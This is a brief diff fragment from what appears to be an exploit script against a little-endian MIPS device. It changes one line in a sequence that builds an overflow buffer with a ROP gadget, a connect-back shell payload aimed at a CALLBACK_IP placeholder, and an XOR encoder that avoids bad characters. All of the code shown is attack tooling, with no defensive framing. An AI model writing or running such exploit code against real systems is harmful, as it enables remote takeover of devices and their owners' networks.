@@ -87,7 +87,7 @@ buf.add_pattern(sleep_return-buf.len())
 buf.add_rop_gadget(0x427a4,description="stackfinder.")
 
 payload=ConnectbackPayload(CALLBACK_IP,LittleEndian)
-encoded_payload=MipsXorEncoder(payload,LittleEndian,badchars=badchars)
+encoded_payload=MipsXorEncoder(payload,badchars=badchars)
 
 buf.add_pattern(shellcode_return-buf.len())
 buf.add_string(encoded_payload.shellcode,
